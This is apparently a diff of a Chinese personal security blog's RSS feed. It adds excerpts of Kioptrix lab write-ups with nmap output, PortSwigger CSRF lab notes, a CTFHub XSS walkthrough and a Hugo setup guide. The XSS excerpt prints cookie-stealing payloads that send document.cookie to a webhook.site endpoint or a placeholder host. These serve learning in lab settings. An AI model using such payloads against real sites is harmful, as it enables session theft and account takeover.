@@ -1,16 +1,173 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>usually885</title><link>https://usually885.github.io/</link><description>Recent content on usually885</description><generator>Hugo</generator><language>zh-CN</language><lastBuildDate>Mon, 25 May 2026 00:00:00 +0800</lastBuildDate><atom:link href="https://usually885.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Guestbook</title><link>https://usually885.github.io/guestbook/</link><pubDate>Mon, 25 May 2026 00:00:00 +0800</pubDate><guid>https://usually885.github.io/guestbook/</guid><description>&lt;p&gt;Welcome. Leave a message here.&lt;/p&gt;</description></item><item><title>Setblog</title><link>https://usually885.github.io/posts/setblog/</link><pubDate>Sat, 23 May 2026 21:33:14 +0800</pubDate><guid>https://usually885.github.io/posts/setblog/</guid><description>&lt;h1 id="hugogithubpages个人博客搭建"&gt;hugo+githubpages个人博客搭建&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>usually885</title><link>https://usually885.github.io/usually-blog/</link><description>Recent content on usually885</description><generator>Hugo</generator><language>zh-CN</language><lastBuildDate>Mon, 29 Jun 2026 21:27:43 +0800</lastBuildDate><atom:link href="https://usually885.github.io/usually-blog/index.xml" rel="self" type="application/rss+xml"/><item><title>kioptix level 2</title><link>https://usually885.github.io/usually-blog/posts/kioptrix-level-2/</link><pubDate>Mon, 29 Jun 2026 21:27:43 +0800</pubDate><guid>https://usually885.github.io/usually-blog/posts/kioptrix-level-2/</guid><description>&lt;p&gt;kali网卡ip 192.168.159.128/24&lt;/p&gt;
+&lt;h2 id="信息收集"&gt;信息收集&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;发现主机&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;直接扫描192.168.159.0/24网段发现目标ip是192.168.159.135&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;端口扫描，服务探测，版本&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://usually885.github.io/usually-blog/posts/kioptrix-level-2/image-20260627182741553.png" alt="image-20260627182741553"&gt;
+&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;└─$ nmap 192.168.159.135 -sV -sC -p-
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-29 19:32 +0800
+Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 28.57% done; ETC: 19:32 (0:00:15 remaining)
+Stats: 0:00:30 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 71.43% done; ETC: 19:32 (0:00:04 remaining)
+Nmap scan report for 192.168.159.135
+Host is up (0.00028s latency).
+Not shown: 65528 closed tcp ports (reset)
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99)
+| ssh-hostkey:
+| 1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
+| 1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
+|_ 1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
+|_sshv1: Server supports SSHv1
+80/tcp open http Apache httpd 2.0.52 ((CentOS))
+|_http-title: Site doesn&amp;#39;t have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.0.52 (CentOS)
+111/tcp open rpcbind 2 (RPC #100000)
+| rpcinfo:
+| program version port/proto service
+| 100000 2 111/tcp rpcbind
+| 100000 2 111/udp rpcbind
+| 100024 1 786/udp status
+|_ 100024 1 789/tcp status
+443/tcp open ssl/http Apache httpd 2.0.52 ((CentOS))
+|_http-server-header: Apache/2.0.52 (CentOS)
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-10-08T00:10:47
+|_Not valid after: 2010-10-08T00:10:47
+| sslv2:
+| SSLv2 supported
+| ciphers:
+| SSL2_RC4_64_WITH_MD5
+| SSL2_RC2_128_CBC_WITH_MD5
+| SSL2_RC4_128_EXPORT40_WITH_MD5
+| SSL2_DES_64_CBC_WITH_MD5
+| SSL2_RC4_128_WITH_MD5
+| SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|_ SSL2_DES_192_EDE3_CBC_WITH_MD5
+|_http-title: Site doesn&amp;#39;t have a title (text/html; charset=UTF-8).
+|_ssl-date: 2026-06-29T08:23:47+00:00; -3h08m58s from scanner time.
+631/tcp open ipp CUPS 1.1
+| http-methods:
+|_ Potentially risky methods: PUT
+|_http-server-header: CUPS/1.1
+|_http-title: 403 Forbidden
+789/tcp open status 1 (RPC #100024)
+3306/tcp open mysql MySQL (unauthorized)
+MAC Address: 00:0C:29:25:CE:9C (VMware)
+Host script results:
+|_clock-skew: -3h08m58s
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.91 seconds
+## 默认脚本去做的版本探测，
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;现在去访问web页面，发现是一个登陆页面，简单试了一下，应该是有sql注入点的，现在做一个扫描网站目录扫描&lt;/p&gt;</description></item><item><title>Kioptix level1</title><link>https://usually885.github.io/usually-blog/posts/kioptix-level1/</link><pubDate>Sun, 21 Jun 2026 17:53:01 +0800</pubDate><guid>https://usually885.github.io/usually-blog/posts/kioptix-level1/</guid><description>&lt;h2 id="信息收集"&gt;信息收集&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;ip -br a
+nmap 192.168.159.0/24 -sn -min-rate 2222 -r
+mkdir nmap_results
+nmap 192.168.159.134 -p- -min-rate 2222 -r -PN -oA nmap_results/port_scan ##到这就能扫出来一些开放的端口服务
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://usually885.github.io/usually-blog/posts/kioptix-level1/image-20260616214031650.png" alt="image-20260616214031650"&gt;
+&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;ls nmap_results/
+cat nmap_results/port_scan.nmap | grep open ## 方便去做指纹探测
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://usually885.github.io/usually-blog/posts/kioptix-level1/image-20260616215305437.png" alt="image-20260616215305437"&gt;
+&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;nmap 192.168.159.134 -p 22,80,111,139,443,1024,65529 -sV -sC --version-all -oA nmap_results/server_info
+## 服务版本系统扫描
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;扫出来的结果：&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 22:01 +0800 Nmap scan report for 192.168.159.134 Host is up (0.00060s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99) | ssh-hostkey: | 1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1) | 1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA) |_ 1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA) |_sshv1: Server supports SSHv1 80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-title: Test Page for the Apache Web Server on Red Hat Linux 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 1024/tcp status |_ 100024 1 1024/udp status 139/tcp open netbios-ssn Samba smbd (workgroup: 4MYGROUP) 443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_ssl-date: 2026-06-16T14:03:23+00:00; +1m52s from scanner time. |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2009-09-26T09:32:06 |_Not valid after: 2010-09-26T09:32:06 |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b | sslv2: | SSLv2 supported | ciphers: | SSL2_RC2_128_CBC_EXPORT40_WITH_MD5 | SSL2_RC4_128_WITH_MD5 | SSL2_RC2_128_CBC_WITH_MD5 | SSL2_DES_192_EDE3_CBC_WITH_MD5 | SSL2_RC4_128_EXPORT40_WITH_MD5 | SSL2_DES_64_CBC_WITH_MD5 |_ SSL2_RC4_64_WITH_MD5 1024/tcp open status 1 (RPC #100024) 65529/tcp closed unknown MAC Address: 00:0C:29:73:A5:97 (VMware) Host script results: |_clock-skew: 1m51s |_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown) |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.55 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;🔥 1️⃣ HTTP（80端口）——最重要入口
+Apache 1.3.20
+mod_ssl 2.8.4
+OpenSSL 0.9.6b&lt;/p&gt;</description></item><item><title>csrf</title><link>https://usually885.github.io/usually-blog/posts/csrf-portswigger/</link><pubDate>Fri, 05 Jun 2026 13:56:20 +0800</pubDate><guid>https://usually885.github.io/usually-blog/posts/csrf-portswigger/</guid><description>&lt;h1 id="csrf跨站请求伪造"&gt;csrf（跨站请求伪造）&lt;/h1&gt;
+&lt;p&gt;&lt;img src="https://usually885.github.io/usually-blog/posts/csrf-portswigger/csrf-overview.jpeg" alt="img"&gt;
+&lt;/p&gt;
+&lt;p&gt;简单来说就是攻击者通过恶意B网站盗用A网站受信用户的cookie伪造恶意请求发送回A网站，达到一些操作目的&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;真实原理（CSRF 的逻辑）：&lt;/strong&gt; 受害者访问恶意网站 ➔ 恶意网站返回一个暗藏杀机的 HTML 表单 ➔ 受害者的浏览器默默执行了这个表单，&lt;strong&gt;直接向目标网站发送了一个请求&lt;/strong&gt; ➔ 浏览器在发请求时，自动把目标网站的 Cookie 带上了 ➔ 目标网站一看有合法的 Cookie，就执行了操作。&lt;/p&gt;
+&lt;p&gt;csrf可分为get型，post型&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;portswigger之csrf通关&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id="无防御措施的-csrf-漏洞构建csrf攻击"&gt;无防御措施的 CSRF 漏洞（构建csrf攻击）&lt;/h2&gt;
+&lt;p&gt;这一关一来给了我们一个user登录，进去之后能看到更改邮件地址的功能，&lt;/p&gt;
+&lt;p&gt;这一关的题意是使用csrf攻击来更改查看者的电子邮件地址并将其上传到漏洞利用服务器的 HTML。&lt;/p&gt;
+&lt;p&gt;思路：要更改查看者的邮箱地址，我们需要先登录上查看者的账号，但是不知道密码，但是通过抓包发现这个网页的数据包带了cookie，所以可以通过bp的csrfpoc来构造恶意网站，达到能借用cookie更改其邮箱地址的操作&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://usually885.github.io/usually-blog/posts/csrf-portswigger/csrf-poc.png" alt="img"&gt;
+&lt;/p&gt;
+&lt;h2 id="针对csrf常见的防御措施"&gt;针对csrf常见的防御措施&lt;/h2&gt;
+&lt;h3 id="csrf令牌"&gt;csrf令牌&lt;/h3&gt;
+&lt;p&gt;CSRF令牌是由服务器端应用程序生成并与客户端共享的唯一、秘密且不可预测的值。当客户端发出执行敏感操作（例如提交表单）的请求时，必须包含正确的CSRF令牌。否则，服务器将拒绝执行请求的操作。&lt;/p&gt;
+&lt;p&gt;将 CSRF 令牌共享给客户端的常用方法是将其作为隐藏参数包含在 HTML 表单中&lt;/p&gt;
+&lt;h4 id="csrf令牌验证中的常见缺陷"&gt;csrf令牌验证中的常见缺陷&lt;/h4&gt;
+&lt;p&gt;1.&lt;strong&gt;csrf令牌的验证方式取决于请求方法&lt;/strong&gt;：有些应用程序在使用 POST 方法请求时会正确验证令牌，但使用 GET 方法时会跳过验证。&lt;/p&gt;
+&lt;p&gt;2.&lt;strong&gt;CSRF令牌的验证取决于令牌是否存在&lt;/strong&gt;：有些应用程序在令牌存在时会正确验证令牌，但如果缺少令牌则会跳过验证。 在这种情况下，攻击者可以移除包含令牌的整个参数（而不仅仅是其值），从而绕过验证并发起 CSRF 攻击：&lt;/p&gt;
+&lt;p&gt;3.&lt;strong&gt;CSRF令牌与用户会话无关&lt;/strong&gt;：某些应用程序不会验证令牌是否与发出请求的用户属于同一会话。相反，这些应用程序维护一个全局令牌池，其中包含其颁发的所有令牌，并接受池中出现的任何令牌。 在这种情况下，攻击者可以使用自己的帐户登录应用程序，获取有效令牌，然后将该令牌提供给受害用户进行 CSRF 攻击。相当于是去拿一个未使用过的token值取伪造请求&lt;/p&gt;
+&lt;p&gt;4.csrf令牌与非会话的cookie相关联：&lt;strong&gt;服务器把 CSRF 令牌绑定到了一个“单独的 cookie”上，但没有把它绑定到“当前登录会话”上，所以攻击者可以拿自己的 token+cookie 组合，借受害者的登录状态完成操作。&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id="实验csrf其中令牌证取决于请求方法"&gt;实验：CSRF，其中令牌证取决于请求方法&lt;/h3&gt;
+&lt;p&gt;根据提示，我们发现这个csrf令牌验证在post请求里面必须要通过在能发送请求，但是我们把它切换到get请求，更高csrf令牌发现验证通过了，此时就可以去改邮件地址了，&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://usually885.github.io/usually-blog/posts/csrf-portswigger/image-20260519230431340.png" alt="image-20260519230431340"&gt;
+&lt;/p&gt;
+&lt;p&gt;能成功更改邮箱地址，说明这里是csrf漏洞点，&lt;/p&gt;
+&lt;h3 id="实验csrf其中令牌验证依赖于令牌是否存在"&gt;实验：CSRF，其中令牌验证依赖于令牌是否存在&lt;/h3&gt;
+&lt;p&gt;这一关根据提示，csrf令牌检查，有时候缺少令牌会直接跳过验证，所以删掉csrf令牌参数就能直接绕过&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://usually885.github.io/usually-blog/posts/csrf-portswigger/image-20260519231759953.png" alt="image-20260519231759953"&gt;
+&lt;/p&gt;
+&lt;h3 id="实验csrf-攻击其中令牌与用户会话无关"&gt;实验：CSRF 攻击，其中令牌与用户会话无关&lt;/h3&gt;
+&lt;p&gt;经过多次抓包实验发现，这个cookie值不变，但是每一次更改地址的token都在变化&lt;/p&gt;
+&lt;p&gt;所以这里我们需要先去拿一个未使用过的csrf令牌，拿到这个的思路就是去抓包在进入账户的收看response响应里面的csrf令牌&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://usually885.github.io/usually-blog/posts/csrf-portswigger/image-20260520152534651.png" alt="image-20260520152534651"&gt;
+&lt;/p&gt;
+&lt;p&gt;rOZzkjkvAJHL5libEv6lj2qeFxPFDCxf这个就是未使用的&lt;/p&gt;</description></item><item><title>Xss Ctfhub</title><link>https://usually885.github.io/usually-blog/posts/xss-ctfhub/</link><pubDate>Wed, 27 May 2026 12:50:14 +0800</pubDate><guid>https://usually885.github.io/usually-blog/posts/xss-ctfhub/</guid><description>&lt;h1 id="ctfhub技能树xss靶场"&gt;ctfhub技能树xss靶场&lt;/h1&gt;
+&lt;p&gt;这个靶场需要使用xss平台来获取bot访问携带的cookie等信息，需用借用到第三方平台我使用的是&lt;a href="https://webhook.site/#!/view/ac6a21ad-4a8e-4d9b-8e6b-a4a32493939f/12e433b3-a4ea-4532-a3ed-caa7f5586fcd/1"&gt;Webhook.site - Test, transform and automate Web requests and emails&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;前置深化知识，url请求拼接查询&lt;/p&gt;
+&lt;p&gt;fetch请求：要想用fetch请求引导js访问，必须把fetch放在&lt;!-- raw HTML omitted --&gt;标签之间或者是在标签内部通过一些事件属性来访问这个fetch网址&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;script&amp;gt;
+fetch(&amp;#39;http://xxxxxxx/?c=&amp;#39; + document.cookie);
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;img src=&amp;#34;x&amp;#34; onerror=&amp;#34;fetch(&amp;#39;http://xxxxxxx/?c=&amp;#39; + document.cookie)&amp;#34;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;还有就是写进payload的+ /等符号，如果不适用url编码可能会被当作空格处理&lt;/p&gt;
+&lt;h2 id="反射型xss"&gt;反射型xss&lt;/h2&gt;
+&lt;p&gt;第一关上来，可以看到整个靶场的思路，先是一个submit，用来验证xss漏洞来的，然后就是下面的send to bot 这个用来模拟真实用户访问我们的xss注入脚本来获取到flag的过程，&lt;/p&gt;
+&lt;p&gt;先验证**&lt;!-- raw HTML omitted --&gt;alert(1)&lt;!-- raw HTML omitted --&gt;script&amp;gt;**这个payload来确认xss漏洞的存在&lt;/p&gt;
+&lt;p&gt;在第一关里面我们使用这个payload：&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://usually885.github.io/usually-blog/posts/xss-ctfhub/image-20260526195003698.png" alt="image-20260526195003698"&gt;
+&lt;/p&gt;
+&lt;p&gt;服务器直接502，代码中的 &lt;code&gt;+&lt;/code&gt; 号、&lt;code&gt;'&lt;/code&gt; 单引号在未经妥善 URL 编码的情况下发送给服务器，极易导致后端解析 URL 参数时发生错位，甚至引发服务器脚本报错。&lt;/p&gt;
+&lt;p&gt;可以通过反引号去掉+ payload：&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;img src=x onerror=&amp;#34;fetch(`https://webhook.site/ac6a21ad-4a8e-4d9b-8e6b-a4a32493939f/?c=${document.cookie}`)&amp;#34;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://usually885.github.io/usually-blog/posts/xss-ctfhub/image-20260526200347961.png" alt="image-20260526200347961"&gt;
+&lt;/p&gt;
+&lt;p&gt;就可以去扎到flag&lt;/p&gt;
+&lt;h2 id="存储型xss"&gt;存储型xss&lt;/h2&gt;
+&lt;p&gt;这一关很快就能发现奇怪的地方，输入了payload进去发现url并没有变化发现这一关是一个post请求提交的，这种存储型的xss，在我们提交了post请求之后，这个数据就已经被写入到了数据库，后面每个访问这个网址的人都会被xss注入&lt;/p&gt;
+&lt;p&gt;只需要刷新页面提交当前的url，bot访问这个页面就会拿到bot的cookie&lt;/p&gt;
+&lt;h2 id="dom反射"&gt;DOM反射&lt;/h2&gt;
+&lt;p&gt;DOM型的xss漏洞说白了就是前端js逻辑过滤，前端没有waf干净我们的输入，这个是发生在前端的，不想反射型和存储型发送到了后端服务器&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://usually885.github.io/usually-blog/posts/xss-ctfhub/image-20260526204109152.png" alt="image-20260526204109152"&gt;
+&lt;/p&gt;
+&lt;p&gt;找到输入的地方要闭合,在输入内容最前方要闭合单引号，然后；分号结束语句，最后在末尾//来注释掉末尾的符号&lt;/p&gt;
+&lt;p&gt;所以这里可以通过fetch的方式引导访问网页&lt;/p&gt;</description></item><item><title>Guestbook</title><link>https://usually885.github.io/usually-blog/guestbook/</link><pubDate>Mon, 25 May 2026 00:00:00 +0800</pubDate><guid>https://usually885.github.io/usually-blog/guestbook/</guid><description>&lt;p&gt;Welcome. Leave a message here.&lt;/p&gt;</description></item><item><title>关于</title><link>https://usually885.github.io/usually-blog/about/</link><pubDate>Mon, 25 May 2026 00:00:00 +0800</pubDate><guid>https://usually885.github.io/usually-blog/about/</guid><description>&lt;p&gt;大家好，我是 usually885。&lt;/p&gt;
+&lt;h2 id="联系方式"&gt;联系方式&lt;/h2&gt;
+&lt;p&gt;如果发现任何博客笔记问题，请联系博主：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;vx：yl18880981324&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;未经授权，请勿擅自搬运博客笔记。&lt;/p&gt;</description></item><item><title>Setblog</title><link>https://usually885.github.io/usually-blog/posts/setblog/</link><pubDate>Sat, 23 May 2026 21:33:14 +0800</pubDate><guid>https://usually885.github.io/usually-blog/posts/setblog/</guid><description>&lt;h1 id="hugogithubpages个人博客搭建"&gt;hugo+githubpages个人博客搭建&lt;/h1&gt;
 &lt;h2 id="环境配置"&gt;环境配置&lt;/h2&gt;
-&lt;p&gt;&lt;img alt="image-20260523141112176" loading="lazy" src="../../PersonalBlogsetup-images/image-20260523141112176.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="../../PersonalBlogsetup-images/image-20260523141112176.png" alt="image-20260523141112176"&gt;
+&lt;/p&gt;
 &lt;p&gt;在系统环境变量配置里面找到path新建一个hugo.exe路径&lt;/p&gt;
 &lt;h1 id="hugo博客搭建流程"&gt;Hugo博客搭建流程&lt;/h1&gt;
 &lt;h2 id="创建站点骨架"&gt;创建站点骨架&lt;/h2&gt;
 &lt;p&gt;在hogo项目里面打开终端输入&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;hugo new site blog
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt="image-20260523141321725" loading="lazy" src="../../PersonalBlogsetup-images/image-20260523141321725.png"&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="../../PersonalBlogsetup-images/image-20260523141321725.png" alt="image-20260523141321725"&gt;
+&lt;/p&gt;
 &lt;p&gt;第二步就是初始化git仓库&lt;/p&gt;
-&lt;p&gt;&lt;img alt="image-20260523142028461" loading="lazy" src="../../PersonalBlogsetup-images/image-20260523142028461.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="../../PersonalBlogsetup-images/image-20260523142028461.png" alt="image-20260523142028461"&gt;
+&lt;/p&gt;
 &lt;p&gt;出现了please tell me who you are 说明 Git 还没配置用户名邮箱。这是第一次用 Git 很正常。&lt;/p&gt;
-&lt;p&gt;&lt;img alt="image-20260523142835174" loading="lazy" src="../../PersonalBlogsetup-images/image-20260523142835174.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="../../PersonalBlogsetup-images/image-20260523142835174.png" alt="image-20260523142835174"&gt;
+&lt;/p&gt;
 &lt;h2 id="本地预览"&gt;本地预览&lt;/h2&gt;
 &lt;p&gt;&lt;strong&gt;第一步就是要去下载主题&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;再blog文件页打开终端，使用git命令拉取主题&lt;/p&gt;
@@ -37,5 +194,5 @@ identifier = &amp;#34;about&amp;#34;
 name = &amp;#34;关于&amp;#34;
 url = &amp;#34;/about/&amp;#34;
 weight = 2
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要想在本地预览这个博客界面需要先使用hugo server -D命令启动服务器，才能在浏览器打开这个blog本地文件&lt;/p&gt;</description></item><item><title>Hello Blog</title><link>https://usually885.github.io/posts/hello-blog/</link><pubDate>Sat, 23 May 2026 14:57:25 +0800</pubDate><guid>https://usually885.github.io/posts/hello-blog/</guid><description>&lt;p&gt;这是我搭建的博客，hello啊&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要想在本地预览这个博客界面需要先使用hugo server -D命令启动服务器，才能在浏览器打开这个blog本地文件&lt;/p&gt;</description></item><item><title>Hello Blog</title><link>https://usually885.github.io/usually-blog/posts/hello-blog/</link><pubDate>Sat, 23 May 2026 14:57:25 +0800</pubDate><guid>https://usually885.github.io/usually-blog/posts/hello-blog/</guid><description>&lt;p&gt;这是我搭建的博客，hello啊&lt;/p&gt;
 &lt;p&gt;你在干嘛呢qwq&lt;/p&gt;</description></item></channel></rss>
